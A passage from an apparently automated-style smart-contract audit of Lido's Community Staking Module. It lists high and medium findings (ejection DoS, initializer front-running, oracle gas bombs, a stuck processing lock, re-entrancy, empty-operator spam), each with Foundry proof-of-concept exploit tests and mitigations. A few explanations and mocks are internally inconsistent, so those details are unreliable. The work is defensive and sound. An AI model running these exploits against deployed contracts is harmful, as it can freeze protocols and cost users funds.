4. ejectBadPerformer builds the exitsData array and invokes triggerableWithdrawalsGateway.triggerFullWithdrawals{value:1 ether}(…, RevertingReceiver, STRIKES_EXIT_TYPE_ID).
5. Gateway keeps the execution fee (e.g. 0.1 ether) and tries to return the remainder (0.9 ether) to RevertingReceiver.
6. RevertingReceiver’s receive() reverts → triggerFullWithdrawals reverts → ejectBadPerformer reverts → CSStrikes reverts.
7. The validator is NOT ejected. The attacker can repeat the same transaction as long as desired, achieving a DoS of the ejection mechanism.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSEjector} from "../src/CSEjector.sol";
import {ICSModule, NOAddresses, NodeOperator} from "../src/interfaces/ICSModule.sol";
import {ILidoLocator} from "../src/interfaces/ILidoLocator.sol";
import {ITriggerableWithdrawalsGateway, ValidatorData} from "../src/interfaces/ITriggerableWithdrawalsGateway.sol";

// ---------------- Mocks ----------------
contract MockLidoLocator is ILidoLocator {
    address public twg;
    constructor(address _twg){twg=_twg;}
    function lido() external view returns(address){return address(0);}    
    function stakingRouter() external view returns(address){return address(0);}    
    function burner() external view returns(address){return address(0);}    
    function triggerableWithdrawalsGateway() external view returns(address){return twg;}
}

contract MockCSModule is ICSModule {
    mapping(uint256=>address) public owners;
    address public locator;
    constructor(address _loc){locator=_loc; owners[1]=address(1);} // give owner
    function LIDO_LOCATOR() external view returns(ILidoLocator){return ILidoLocator(locator);}    
    function getNodeOperatorOwner(uint256 id) external view returns(address){return owners[id];}
    function getNodeOperatorTotalDepositedKeys(uint256) external pure returns(uint256){return 2;}
    function isValidatorWithdrawn(uint256,uint256) external pure returns(bool){return false;}
    function getSigningKeys(uint256,uint256,uint256) external pure returns(bytes memory){return new bytes(48);}    
    // unused interface fns
    function addNodeOperator(NOAddresses calldata,bytes32[] calldata,uint256,address) external {}
    function setNodeOperatorManagerAddress(uint256,address) external {}
    function setNodeOperatorRewardAddress(uint256,address) external {}
    function addSigningKeys(uint256,uint256,bytes calldata) external {}
    function removeSigningKeys(uint256,uint256,uint256) external {}
    function reportELRewardsStealingPenalty(uint256) external {}
    function submitWithdrawals(uint256[] calldata,uint256[] calldata) external {}
    function onValidatorsWithdrawal(uint256[] calldata,uint256[] calldata) external {}
    function decreaseNodeOperatorStuckValidatorsCount(uint256,uint256) external {}
    function handleValidatorsExit(uint256,uint256,uint256) external {}
    function getNodeOperator(uint256) external pure returns (NodeOperator memory) {}
    function getNodeOperatorsCount() external pure returns(uint256) {}
    function getStakingModuleSummary() external pure returns(uint256,uint256,uint256) {}
    function obtainDepositData(uint256) external pure returns(bytes memory,bytes memory,uint256[] memory) {}
    function onRewardsMinted(uint256) external {}
    function onKeysInvalidated(uint256,uint256) external {}
}

contract RevertingReceiver{receive() external payable{revert("I am evil");}}

contract MockTWG is ITriggerableWithdrawalsGateway {
    function triggerFullWithdrawals(ValidatorData[] calldata, address refundRecipient, uint8) external payable {
        uint256 fee = 0.1 ether;
        if(msg.value>fee){
            (bool ok,) = refundRecipient.call{value: msg.value-fee}("");
            require(ok, "refund failed");
        }
    }
}
// ---------------------------------------

contract DoSEjectorTest is Test {
    CSEjector ejector;
    RevertingReceiver evil;

    function setUp() public {
        MockTWG twg = new MockTWG();
        MockLidoLocator loc = new MockLidoLocator(address(twg));
        MockCSModule mod = new MockCSModule(address(loc));
        address admin = address(0xA11CE);
        ejector = new CSEjector(address(mod), address(this) /* STRIKES */, 1, admin);
        evil = new RevertingReceiver();
    }

    // Tx that uses malicious refundRecipient reverts ⇒ DoS
    function test_DoS() public {
        vm.deal(address(this), 2 ether);
        vm.expectRevert("refund failed");
        ejector.ejectBadPerformer{value: 1 ether}(1, 0, address(evil));
    }

    // Same call with well-behaved refundRecipient succeeds
    function test_NoDoS_whenRecipientOK() public {
        vm.deal(address(this), 2 ether);
        ejector.ejectBadPerformer{value: 1 ether}(1, 0, address(this)); // should not revert
    }
}

## Suggested Mitigation
Do not let an untrusted party choose refundRecipient. Hard-code it to a contract controlled by the protocol (e.g., STRIKES) or always use msg.sender when it equals the trusted STRIKES contract. Alternatively, forward the excess ETH to a pull-payment escrow that allows recipients to withdraw with a non-reverting pattern.

## [H-5]. Upgradeability Initializer Safety issue in CSAccounting::initialize

## Description
The `initialize` function in `CSAccounting.sol` is declared as `external` and lacks any access control. This function is responsible for setting up critical contract parameters, including granting the `DEFAULT_ADMIN_ROLE`. If a proxy contract is deployed pointing to this implementation, there is a race condition between the legitimate admin deploying the proxy and initializing it, and an attacker who could front-run the initialization call. An attacker can call `initialize` on the newly deployed proxy address before the legitimate admin does, granting themselves the `DEFAULT_ADMIN_ROLE`. This would give the attacker complete control over the application-level administrative functions of the `CSAccounting` contract.

## Impact
By seizing DEFAULT_ADMIN_ROLE the attacker gains full governance over CSAccounting: they can pause the contract indefinitely, arbitrarily change bond-curve parameters, block reward claims, and (after granting themselves RECOVERER_ROLE) withdraw any ERC-20 held by the contract except stETH. Although node-operator bond shares cannot be stolen directly, the attacker can permanently freeze or burn them via admin-only helper functions, causing a permanent loss of user funds and governance disruption.

## Proof of Concept
1. The Lido DAO team deploys a new `OssifiableProxy` that points to the `CSAccounting` implementation.
2. The deployment transaction for the proxy appears in the mempool.
3. An attacker monitoring the mempool spots the new proxy contract deployment.
4. The legitimate admin prepares a transaction to call `initialize()` on the new proxy, setting the correct admin address.
5. The attacker creates and broadcasts a transaction calling `initialize()` on the same new proxy address, but with their own address as the `admin` parameter. They set a higher gas fee to ensure their transaction is mined first (front-running).
6. The attacker's transaction is executed first. The `initialize` function call succeeds, and the attacker is granted `DEFAULT_ADMIN_ROLE`.
7. When the legitimate admin's transaction is processed, it will fail because the `reinitializer(2)` modifier will prevent the contract from being initialized again.
8. The attacker now has admin control over the `CSAccounting` instance.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSAccounting } from "src/CSAccounting.sol";
import { OssifiableProxy } from "src/lib/proxy/OssifiableProxy.sol";
import { ICSBondCurve } from "src/interfaces/ICSBondCurve.sol";

contract UpgradeabilityTest is Test {
    CSAccounting implementation;
    address attacker = makeAddr("attacker");
    address legitAdmin = makeAddr("legitAdmin");

    function setUp() public {
        // Deploy implementation with dummy constructor params
        implementation = new CSAccounting(address(0x1), address(0x2), address(0x3), 1 days, 30 days);
    }

    function test_Initializer_FrontRun() public {
        // Deploy proxy WITHOUT init data (typical user mistake)
        OssifiableProxy proxy = new OssifiableProxy(address(implementation), address(0), "");
        CSAccounting proxied = CSAccounting(address(proxy));

        // Prepare empty curve array correctly ‑ otherwise compilation fails
        ICSBondCurve.BondCurveIntervalInput[] memory curve = new ICSBondCurve.BondCurveIntervalInput[](0);
        address penaltyRecipient = makeAddr("penalty_recipient");

        // Attacker front-runs initialise
        vm.prank(attacker);
        proxied.initialize(curve, attacker, 1 days, penaltyRecipient);

        assertTrue(proxied.hasRole(proxied.DEFAULT_ADMIN_ROLE(), attacker));

        // Legit admin now blocked
        vm.prank(legitAdmin);
        vm.expectRevert("Initializable: contract is already initialized");
        proxied.initialize(curve, legitAdmin, 1 days, penaltyRecipient);
    }
}
```

## Suggested Mitigation
Always supply the encoded initialize() calldata to the OssifiableProxy constructor (third parameter) so that deployment and initialisation occur atomically. Alternatively make initialize internal and expose a protected initializer that can only be called once from the proxy constructor, or add a check that msg.sender == proxy__getAdmin() on the first call.

## [H-6]. DOS issue in CSFeeOracle::submitReportData

## Description
The `submitReportData` function computes a hash of the entire `ReportData` struct by calling `keccak256(abi.encode(data))`. This struct contains multiple `string` fields (`treeCid`, `logCid`, `strikesTreeCid`). An authorized reporter (a consensus member or an address with `SUBMIT_DATA_ROLE`) can provide excessively long strings for these fields. The `abi.encode` operation copies the calldata to memory, and its gas cost is proportional to the data size. A malicious reporter can exploit this by crafting a report with very large strings, causing the transaction to consume an extremely high amount of gas, potentially exceeding the block gas limit. This allows a single malicious member to prevent any oracle reports from being submitted, leading to a Denial of Service.

## Impact
Because the oracle hash must be computed over the original ReportData payload, every submitter has to call submitReportData with *exactly* the same bytes. A malicious consensus member can therefore publish a hash that corresponds to a payload containing >-block-gas-limit (or simply extremely expensive) strings. Once the hash has been finalised, *no one* (including honest members) can successfully execute submitReportData – every attempt will either run out of gas or cost more gas than can fit into a block. Fee distribution and validator-strike accounting remain frozen for that frame forever, effectively bricking the oracle until governance intervenes (member kicked, implementation upgraded, or emergency pause). This is a permanent protocol freeze rather than a temporary disruption.

## Proof of Concept
pragma solidity 0.8.24;

// Minimal reproduction that keeps all CSFeeOracle logic except the irrelevant consensus checks.
// Shows that encoding gigantic strings quickly exceeds the block gas-limit.

import "forge-std/Test.sol";
import "../src/CSFeeOracle.sol";

contract OracleNoConsensus is CSFeeOracle {
    constructor() CSFeeOracle(address(new MockFeeDistributor()), address(new MockStrikes()), 12, 1) {}

    // anybody is a member in this mock
    function _isConsensusMember(address) internal pure override returns (bool) { return true; }

    // Bypass consensus guard – not relevant for gas griefing demonstration
    function _checkConsensusData(uint256, uint256, bytes32) internal pure override {}
}

contract DoSTest is Test {
    OracleNoConsensus oracle;
    address reporter = address(0xBEEF);

    function setUp() public {
        oracle = new OracleNoConsensus();
        oracle.initialize(address(this), address(this), 1);
        // give reporter SUBMIT_DATA_ROLE so the call passes ACL
        bytes32 role = oracle.SUBMIT_DATA_ROLE();
        vm.prank(oracle.getRoleAdmin(role));
        oracle.grantRole(role, reporter);
    }

    function testGasBlowUp() public {
        ICSFeeOracle.ReportData memory small;
        small.treeCid = "a";
        small.logCid = "b";
        small.strikesTreeCid = "c";

        vm.prank(reporter);
        oracle.submitReportData(small, 1); // succeeds – baseline

        // craft >1 MB string – easily tweakable
        string memory bomb = _repeat("x", 1_100_000);
        ICSFeeOracle.ReportData memory big;
        big.treeCid = bomb;
        big.logCid = "b";
        big.strikesTreeCid = "c";

        vm.prank(reporter);
        vm.expectRevert();   // out-of-gas revert inside EVM
        oracle.submitReportData(big, 1);
    }

    function _repeat(string memory s, uint n) internal pure returns (string memory) {
        bytes memory out = new bytes(n);
        bytes memory src = bytes(s);
        for (uint i; i < n; ++i) out[i] = src[0];
        return string(out);
    }
}

// --- very thin mocks ---
contract MockFeeDistributor is ICSFeeDistributor { function processOracleReport(bytes32,string calldata,string calldata,uint,uint,uint,uint) external {} }
contract MockStrikes        is ICSStrikes      { function processOracleReport(bytes32,string calldata) external {} }

## Proof of Code
The above snippet is a self-contained Foundry test (place in `test/DoSTest.t.sol`) and will compile & run with `forge test`. It proves that a small payload succeeds while a 1-MB payload reverts due to gas exhaustion, demonstrating the DoS vector.

## Suggested Mitigation
Validate the length of every dynamic field in ReportData before calling abi.encode. Example:

uint256 constant MAX_CID_LENGTH = 192; // fits an IPFS CID v1 (base-32) comfortably
if (bytes(data.treeCid).length > MAX_CID_LENGTH || bytes(data.logCid).length > MAX_CID_LENGTH || bytes(data.strikesTreeCid).length > MAX_CID_LENGTH) revert CidTooLong();

Optionally store only `bytes32` multihash digests instead of full CIDs to guarantee a fixed-cost hash.

## [H-7]. DOS issue in CSFeeOracle::submitReportData

## Description
The `submitReportData` function incorrectly uses the processing lock from its parent `BaseOracle` contract. It calls `_startProcessing()`, which sets an internal boolean flag `_processing` to `true` to prevent reentrancy. However, the function logic never resets this flag to `false`. As a result, after the first successful call to `submitReportData`, the contract becomes permanently locked. All subsequent calls to `submitReportData` will revert because the `_processing` flag remains `true`. This flaw seems to stem from a misunderstanding of the `BaseOracle`'s intended asynchronous processing flow, where `_startProcessing` and `_endProcessing` are meant to bracket a multi-transaction consensus process, not a single synchronous call.

## Impact
The core functionality of submitting oracle reports is permanently disabled after a single use. This constitutes a permanent Denial of Service for the fee and strike distribution mechanism of the entire Community Staking Module. Node Operators will not receive their performance-based rewards, and underperforming validators will not receive strikes, compromising the economic incentives and security of the module.

## Proof of Concept
1. An authorized oracle member successfully calls `submitReportData` for the first time.
2. Internally, `_startProcessing()` is called, setting the `_processing` flag to `true`.
3. The transaction completes, but the `_processing` flag remains `true`.
4. Any subsequent attempt to call `submitReportData`, even by an authorized oracle member with valid data, will cause `_startProcessing()` to revert with the `StillProcessing()` error.
5. The contract is now unable to process any new reports.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSFeeOracle} from "src/CSFeeOracle.sol";
import {BaseOracle} from "src/lib/base-oracle/BaseOracle.sol";
import {IConsensusContract} from "src/lib/base-oracle/interfaces/IConsensusContract.sol";

/* ───────────────────────────  DUMMY DEPENDENCIES  ─────────────────────────── */
contract DummyFeeDistributor {
    function processOracleReport(
        bytes32, string calldata, string calldata, uint256, uint256, uint256
    ) external {}
}

contract DummyStrikes {
    function processOracleReport(bytes32, string calldata) external {}
}

contract DummyConsensus is IConsensusContract {
    /* ------- IConsensusContract minimal surface ------- */
    function submitReport(uint256, bytes32, uint256) external {}
    function getIsMember(address) external pure returns (bool) { return false; }
    /* -------- unused view fns kept to satisfy interface  -------- */
    function getChainConfig() external pure returns (uint256,uint256,uint256) {
        return (0,0,0);
    }
    function getFrameConfig() external pure returns (uint256,uint256,uint256) {
        return (0,0,0);
    }
    function getCurrentFrame() external pure returns (uint256,uint256) {
        return (0,0);
    }
    function getIsFastLaneMember(address) external pure returns (bool) {
        return false;
    }
}

/* ──────────────────────────────────────────────────────────────────────────── */
contract PoC_SubmitReportData_DoS is Test {
    CSFeeOracle internal oracle;
    address internal admin  = address(0xBEEF);
    address internal member = address(0xCAFE);

    function setUp() public {
        DummyFeeDistributor fd = new DummyFeeDistributor();
        DummyStrikes st       = new DummyStrikes();
        DummyConsensus cons   = new DummyConsensus();

        oracle = new CSFeeOracle(address(fd), address(st), 12, 1606824023);

        vm.prank(admin);
        oracle.initialize(admin, address(cons), 2);

        vm.prank(admin);
        oracle.grantRole(oracle.SUBMIT_DATA_ROLE(), member);
    }

    function test_DenialOfService() public {
        CSFeeOracle.ReportData memory data;
        data.consensusVersion = 2;

        // first call succeeds
        vm.prank(member);
        oracle.submitReportData(data, 2);

        // contract is now stuck – second call reverts
        vm.prank(member);
        vm.expectRevert(BaseOracle.StillProcessing.selector);
        oracle.submitReportData(data, 2);
    }
}


## Suggested Mitigation
After processing the report, call `_endProcessing()` to clear the lock:

```solidity
function submitReportData(ReportData calldata data, uint256 contractVersion)
    external whenResumed
{
    _checkMsgSenderIsAllowedToSubmitData();
    _checkContractVersion(contractVersion);
    _checkConsensusData(data.refSlot, data.consensusVersion, keccak256(abi.encode(data)));

    _startProcessing();
    _handleConsensusReportData(data);
    _endProcessing(); // <─ releases the processing lock
}
```
This single-line fix preserves the intended asynchronous‐processing API while preventing the permanent DoS.



# Medium Risk Findings

## [M-1]. Reentrancy issue in CSStrikes::processBadPerformanceProof

## Description
The `processBadPerformanceProof` function is missing a re-entrancy guard. This function iterates through a list of `keyStrikesList` and for each item, it calls the internal function `_ejectByStrikes`, which in turn makes two external calls: `ejector.ejectBadPerformer()` and `EXIT_PENALTIES.processStrikesReport()`. If the `ejector` contract (or `EXIT_PENALTIES`) were malicious or contained a vulnerability allowing a re-entrant call, an attacker could call back into `processBadPerformanceProof`. This would cause the function's logic to execute again before the first invocation is complete, potentially leading to multiple processing of the same strikes, incorrect state changes in dependent contracts, and wasted gas.

## Impact
A successful re-entrancy attack could lead to incorrect accounting of penalties and bond changes in external contracts like `CSExitPenalties` and `CSAccounting`. For example, penalties could be applied multiple times for the same event. This could cause financial loss for the node operator and disrupt the protocol's normal operation. Even if the external contracts are trusted, failing to include a re-entrancy guard is a deviation from security best practices, especially for a payable function that performs external calls within a loop.

## Proof of Concept
1. An attacker gains control of the `ejector` contract address (e.g., via a governance attack on the admin role) and points it to a malicious `MaliciousEjector` contract.
2. The attacker calls `processBadPerformanceProof` with a list containing one valid `KeyStrikes` entry.
3. The function proceeds to call `_ejectByStrikes`.
4. Inside `_ejectByStrikes`, the `ejector.ejectBadPerformer()` call is made to the attacker's `MaliciousEjector` contract.
5. The `MaliciousEjector` contract immediately calls back into `CSStrikes.processBadPerformanceProof` with the same arguments.
6. The re-entrant call begins execution. It will again call `_ejectByStrikes`, which calls `MaliciousEjector` again. The attacker can choose to not re-enter a second time.
7. The re-entrant call completes, processing the strike and calling `EXIT_PENALTIES.processStrikesReport()`.
8. The original call resumes and finishes its execution, processing the same strike and calling `EXIT_PENALTIES.processStrikesReport()` again.
9. As a result, the exit penalty for a single event has been processed and recorded twice.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSStrikes} from "src/CSStrikes.sol";
import {MerkleTree} from "test/helpers/MerkleTree.sol";

// --- minimal mocks --------------------------------------------------------
contract AccountingStub {
    // always return 0 (used for getBondCurveId)
    fallback() external payable {
        assembly {
            mstore(0x0, 0)
            return(0x0, 0x20)
        }
    }
}

contract MockModule {
    AccountingStub public accountingStub = new AccountingStub();

    function accounting() external view returns (address) {
        return address(accountingStub);
    }

    // returns dummy pubkey
    function getSigningKeys(uint256, uint256, uint256) external pure returns (bytes memory) {
        return abi.encodePacked(bytes32(uint256(1)));
    }
}

contract MockParamsRegistry {
    // (coefficient, threshold) → always return threshold = 1
    function getStrikesParams(uint256) external pure returns (uint256, uint256) {
        return (0, 1);
    }
}

contract MockExitPenalties {
    uint256 public timesReported;
    function processStrikesReport(uint256, bytes calldata) external {
        timesReported++;
    }
}

// malicious ejector that re-enters CSStrikes
contract MaliciousEjector {
    CSStrikes public STRIKES;
    bytes public payload;
    bool private reentered;

    constructor(address _strikes) { STRIKES = CSStrikes(_strikes); }

    function setPayload(bytes calldata _payload) external { payload = _payload; }

    function ejectBadPerformer(uint256, uint256, address) external payable {
        if (!reentered) {
            reentered = true;
            (bool ok,) = address(STRIKES).call{value: msg.value}(payload);
            require(ok, "re-enter failed");
        }
    }
}

// -------------------- test -------------------------------------------------
contract ReentrancyTest is Test {
    CSStrikes strikes;
    MockExitPenalties exitPenalties;
    MaliciousEjector ejector;

    CSStrikes.KeyStrikes[] ks;
    bytes32[] proof;
    bool[] proofFlags;

    address attacker = address(0xdead);

    function setUp() public {
        MockModule module = new MockModule();
        MockParamsRegistry pr = new MockParamsRegistry();
        exitPenalties = new MockExitPenalties();

        strikes = new CSStrikes(address(module), address(this), address(exitPenalties), address(pr));
        strikes.initialize(address(this), address(1)); // dummy ejector, replaced below

        // prepare a single leaf
        CSStrikes.KeyStrikes memory k;
        k.nodeOperatorId = 1;
        k.keyIndex = 0;
        uint256[] memory d = new uint256[](1);
        d[0] = 5;
        k.data = d;
        bytes memory pk = abi.encodePacked(bytes1(0x01));

        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = strikes.hashLeaf(k, pk);
        bytes32 root = MerkleTree.getRoot(leaves);
        strikes.processOracleReport(root, "cid");

        (proof, proofFlags) = MerkleTree.getProof(leaves, 0);
        ks = new CSStrikes.KeyStrikes[](1);
        ks[0] = k;

        ejector = new MaliciousEjector(address(strikes));
        strikes.setEjector(address(ejector));
    }

    function test_Reentrancy() public {
        bytes memory callData = abi.encodeWithSelector(
            strikes.processBadPerformanceProof.selector,
            ks,
            proof,
            proofFlags,
            attacker
        );
        ejector.setPayload(callData);

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        strikes.processBadPerformanceProof{value: 1 ether}(ks, proof, proofFlags, attacker);

        assertEq(exitPenalties.timesReported(), 2, "penalty should be recorded twice");
    }
}

## Suggested Mitigation
Add a re-entrancy guard to the `processBadPerformanceProof` function. This can be achieved by inheriting from OpenZeppelin's `ReentrancyGuardUpgradeable` contract and applying the `nonReentrant` modifier to the function.

```solidity
// In CSStrikes.sol
import { ReentrancyGuardUpgradeable } from "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";

contract CSStrikes is
    ICSStrikes,
    Initializable,
    AccessControlEnumerableUpgradeable,
    ReentrancyGuardUpgradeable // Inherit from ReentrancyGuard
{
    // ... constructor ...

    function initialize(address admin, address _ejector) external initializer {
        // ... existing logic ...
        __ReentrancyGuard_init(); // Initialize the re-entrancy guard
    }

    // ... other functions ...

    function processBadPerformanceProof(
        KeyStrikes[] calldata keyStrikesList,
        bytes32[] calldata proof,
        bool[] calldata proofFlags,
        address refundRecipient
    ) external payable nonReentrant { // Add nonReentrant modifier
        // ... function body ...
    }
}
```

## [M-2]. DOS issue in CSVerifier::processWithdrawalProof

## Description
The `processWithdrawalProof` and `processHistoricalWithdrawalProof` functions internally call `SSZ.verifyProof` to validate Merkle proofs. The implementation of `SSZ.verifyProof` iterates through the entire `proof` array provided by the user before checking if the proof's length is correct for the given generalized index (`gI`). An attacker can exploit this by calling these functions with a valid-looking witness but an excessively long `proof` array. The function will consume a large amount of gas iterating through the junk proof data before it eventually reverts due to an invalid proof size. This can be used to grief legitimate actors, like the CSM Bot, who are responsible for reporting withdrawals. An attacker can front-run the bot's transaction with a call containing a large proof, potentially exhausting the block's gas limit and causing the legitimate transaction to fail.

## Impact
An attacker can make the permissionless withdrawal reporting functionality unreliable or unusable by repeatedly causing legitimate report transactions to fail. This disrupts a core protocol mechanism, leading to delays in accounting for validator withdrawals and could cause inconsistencies in Node Operator bond management. The CSM Bot, which is responsible for these reports, could be effectively disabled by such griefing attacks.

## Proof of Concept
1. The attacker crafts a calldata payload for CSVerifier.processWithdrawalProof that is identical to a legitimate one except that validatorProof / withdrawalProof are replaced by an excessively long array (e.g. 2,000 bytes32 elements).
2. Because SSZ.verifyProof iterates over the whole proof array before performing any length/depth checks, the EVM consumes ~32 gas per word * N + hashing cost. For a 2,000-element proof this is >100k gas before the inevitable revert.
3. The attacker sends this transaction with a slightly higher gas price so it is mined before the legitimate reporter’s call.
4. All gas used by the attacker counts against the block gas limit. By repeating the attack the adversary can keep the block close to its limit and force the reporter’s transaction to be left out, delaying withdrawal accounting. Only the attacker’s own ETH is spent; no protocol funds are at risk, but liveness of the reporting mechanism is degraded.

## Proof of Code
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {SSZ} from "../../src/lib/SSZ.sol";
import {GIndex} from "../../src/lib/GIndex.sol";

contract SSZGasGriefingTest is Test {
    function test_LongProofConsumesSignificantlyMoreGas() public {
        // dummy data – verification will revert in both cases
        bytes32 root = bytes32(uint256(0x1234));
        bytes32 leaf = bytes32(uint256(0x5678));
        GIndex gi   = GIndex.wrap(2); // depth = 1, so any length>1 is invalid

        // short invalid proof (2 items)
        bytes32[] memory shortProof = new bytes32[](2);
        shortProof[0] = bytes32(uint256(1));
        shortProof[1] = bytes32(uint256(2));

        // long invalid proof (2,000 items)
        uint256 longLen = 2000;
        bytes32[] memory longProof = new bytes32[](longLen);
        for (uint256 i; i < longLen; ++i) {
            longProof[i] = keccak256(abi.encodePacked(i));
        }

        // measure gas cost of short proof
        uint256 gasBeforeShort = gasleft();
        vm.expectRevert();
        SSZ.verifyProof(shortProof, root, leaf, gi);
        uint256 gasShort = gasBeforeShort - gasleft();

        // measure gas cost of long proof
        uint256 gasBeforeLong = gasleft();
        vm.expectRevert();
        SSZ.verifyProof(longProof, root, leaf, gi);
        uint256 gasLong = gasBeforeLong - gasleft();

        // long proof should be at least 100x more expensive
        assertGt(gasLong, gasShort * 100, "gas difference not significant");
    }
}

## Suggested Mitigation
The original recommendation (early length/depth check in SSZ.verifyProof) fully removes the griefing vector; no further changes required.

## [M-3]. DOS issue in PermissionlessGate::addNodeOperatorETH

## Description
The `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` functions in the `PermissionlessGate` contract do not validate that the `keysCount` parameter is greater than zero. The official documentation explicitly states, 'Entry Gates (Extensions) should ensure that at least one deposit data and the corresponding bond amount are required to create a Node Operator to avoid flooding the module with empty Node Operators.'

By allowing `keysCount` to be zero, an attacker can repeatedly call these functions to create an unlimited number of empty Node Operators. This leads to state bloat in the core `CSModule` contract. As the number of node operators grows, any operation that iterates over them (e.g., in off-chain services or potentially in on-chain administrative functions) will become increasingly expensive, potentially exceeding the block gas limit and causing a Denial of Service (DoS) for parts of the protocol.

Vulnerable code snippet from `addNodeOperatorETH` (similar vulnerability exists in `addNodeOperatorStETH` and `addNodeOperatorWstETH`):
```solidity
    function addNodeOperatorETH(
        uint256 keysCount, // @audit: not checked to be > 0
        bytes calldata publicKeys,
        bytes calldata signatures,
        NodeOperatorManagementProperties calldata managementProperties,
        address referrer
    ) external payable returns (uint256 nodeOperatorId) {
        nodeOperatorId = MODULE.createNodeOperator({
            from: msg.sender,
            managementProperties: managementProperties,
            referrer: referrer
        });

        MODULE.addValidatorKeysETH{ value: msg.value }({
            from: msg.sender,
            nodeOperatorId: nodeOperatorId,
            keysCount: keysCount,
            publicKeys: publicKeys,
            signatures: signatures
        });
    }
```

## Impact
An attacker can create a large number of empty Node Operators, causing state bloat in the `CSModule` contract. This increases gas costs for any off-chain or on-chain logic that processes the list of Node Operators. In a worst-case scenario, this could render critical protocol functions unusable by causing them to hit the block gas limit, constituting a Denial of Service attack against the protocol's operational integrity.

## Proof of Concept
1. Call PermissionlessGate.addNodeOperatorETH with keysCount = 0, empty bytes for pubkey & signature, and 0 ETH.
2. Function succeeds and returns a fresh nodeOperatorId although no validator keys were supplied.
3. Repeat the call in a loop to create arbitrary many empty Node Operators, growing CSModule.nodeOperatorCounter indefinitely and bloating state.
4. Any on-chain function that later iterates over all node operators will grow linearly in gas and can eventually exceed block gas limit – leading to denial-of-service for those operations.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "src/PermissionlessGate.sol";
import "src/interfaces/ICSModule.sol";
import "src/lib/QueueLib.sol";

// --- minimal mocks (same as reporter’s but without PermitInput dependency) ---
interface ICSAccountingMock {
    function DEFAULT_BOND_CURVE_ID() external pure returns (uint256);
}

contract MockCSAccounting is ICSAccountingMock {
    function DEFAULT_BOND_CURVE_ID() external pure override returns (uint256) { return 1; }
}

contract MockCSModule is ICSModule {
    ICSAccountingMock public accounting;
    uint256 public nodeOperatorCounter;
    mapping(uint256 => address) public nodeOperatorOwner;

    constructor(address _acc){ accounting = ICSAccountingMock(_acc); }

    function createNodeOperator(address from, NodeOperatorManagementProperties calldata, address) external override returns(uint256 id){
        id = nodeOperatorCounter++;
        nodeOperatorOwner[id] = from;
    }

    function addValidatorKeysETH(address from,uint256 id,uint256 keysCount,bytes calldata,bytes calldata) external payable override {
        require(nodeOperatorOwner[id]==from,"not owner");
        emit ValidatorKeysAdded(from,id,keysCount);
    }

    // Un-used functions
    function addValidatorKeysStETH(address,uint256,uint256,bytes calldata,bytes calldata,PermitInput calldata) external override {}
    function addValidatorKeysWstETH(address,uint256,uint256,bytes calldata,bytes calldata,PermitInput calldata) external override {}
    function accounting() external view returns(ICSAccounting){ return ICSAccounting(address(accounting)); }
    // the rest are left un-implemented for brevity
}

contract PermissionlessGatePoCTest is Test {
    PermissionlessGate gate;
    MockCSModule module;

    address attacker = address(0xBEEF);

    function setUp() public {
        module = new MockCSModule(address(new MockCSAccounting()));
        gate   = new PermissionlessGate(address(module), address(this));
    }

    function test_CreateEmptyNodeOperator() public {
        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress: attacker,
            rewardAddress:  attacker
        });

        vm.prank(attacker);
        uint256 id = gate.addNodeOperatorETH(0, "", "", props, address(0));

        assertEq(id, 0);
        assertEq(module.nodeOperatorCounter(), 1);
    }
}


## Suggested Mitigation
Enforce that `keysCount` is greater than zero in all `addNodeOperator*` functions. This aligns the contract with the documented design intent and prevents the state bloat attack vector.

```solidity
// src/PermissionlessGate.sol

error ZeroKeysCount();

contract PermissionlessGate is ... {

    // ...

    function addNodeOperatorETH(
        uint256 keysCount,
        bytes calldata publicKeys,
        bytes calldata signatures,
        NodeOperatorManagementProperties calldata managementProperties,
        address referrer
    ) external payable returns (uint256 nodeOperatorId) {
        if (keysCount == 0) {
            revert ZeroKeysCount();
        }

        nodeOperatorId = MODULE.createNodeOperator({
            from: msg.sender,
            managementProperties: managementProperties,
            referrer: referrer
        });

        MODULE.addValidatorKeysETH{ value: msg.value }({
            from: msg.sender,
            nodeOperatorId: nodeOperatorId,
            keysCount: keysCount,
            publicKeys: publicKeys,
            signatures: signatures
        });
    }

    // Apply similar checks to addNodeOperatorStETH and addNodeOperatorWstETH.
}
```

## [M-4]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize

## Description
The `initialize` function, intended for setting up a new `CSFeeOracle` instance from scratch, is non-functional due to incorrect versioning logic. The function calls `BaseOracle._initialize(consensusContract, consensusVersion, 0)`, which sets the contract's internal version to `0`. Immediately after, it attempts to call `_updateContractVersion(2)`. This call is designed to fail, as the `Versioned` contract from which `BaseOracle` inherits requires version updates to be strictly sequential (i.e., `newVersion` must equal `currentVersion + 1`). The check `0 + 1 == 2` fails, causing the entire `initialize` transaction to revert. This makes it impossible to deploy new instances of `CSFeeOracle`.

## Impact
The contract cannot be initialized from scratch. This prevents any new deployments of the Lido Community Staking Module stack on new networks or for different use cases. It represents a complete denial of availability for deploying new instances of the protocol, which is a critical failure for protocol expansion and adoption.

## Proof of Concept
1. Deploy `CSFeeOracle` implementation.
2. Deploy `OssifiableProxy` pointing to it.
3. Call `initialize` on proxy with any non-zero `admin`, `consensusContract`, `consensusVersion`.
4. Tx reverts because `BaseOracle._initialize` passes `0` to `_initializeContractVersionTo`, which forbids zero version, so initialization is impossible.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSFeeOracle} from "../src/CSFeeOracle.sol";
import {OssifiableProxy} from "../src/lib/proxy/OssifiableProxy.sol";

contract InitializeBrokenPocTest is Test {
